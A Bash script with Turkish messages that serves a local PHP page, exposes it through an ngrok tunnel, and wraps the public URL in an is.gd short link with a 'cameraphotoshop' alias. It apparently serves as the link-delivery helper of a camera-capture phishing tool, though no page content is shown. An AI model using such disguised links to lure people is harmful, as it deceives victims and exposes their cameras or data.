#!/bin/bash
if [[ $1 == -bg ]];then
	if [[ $2 == -p ]];then
		php -S 127.0.0.1:$3 & ngrok http $3 > /dev/null &
		sleep 1
		echo
		echo
		echo
		printf "\e[33m[*]\e[97m LİNK OLUŞTURULUYOR.."
		echo
		echo
		while :
		do
			kontrol=$(curl -s http://127.0.0.1:4040/api/tunnels |grep -o \"https://[a-z.0-9.A-Z.]\*.ngrok.io\" |tr -d '"' |wc -l)
			if [[ $kontrol == 1 ]];then
				break
			fi
		done
		echo
		echo
		echo
		printf "LİNK \e[31m>>\e[97m "
		curl -s http://127.0.0.1:4040/api/tunnels |grep -o \"https://[a-z.0-9.A-Z.]\*.ngrok.io\" |tr -d '"'
		echo
		echo
		echo
		url=$(curl -s http://127.0.0.1:4040/api/tunnels |grep -o \"https://[a-z.0-9.A-Z.]\*.ngrok.io\" |tr -d '"')
		curl -s -X POST "https://is.gd/create.php" -d url="$url" -d shorturl="cameraphotoshop$(date +%d%m%G%H%S)" > .ozellink.txt
		ozellink=$(cat .ozellink.txt |grep -o https://is.gd/[A-Z.a-z.0-9]\* |sed -n 1p)
		printf "ÖZEL LİNK \e[31m>>\e[97m $ozellink "
		rm .ozellink.txt
		echo
		echo
		echo
		exit
	fi
else
	php -S 127.0.0.1:$1 & ngrok http $1
fi
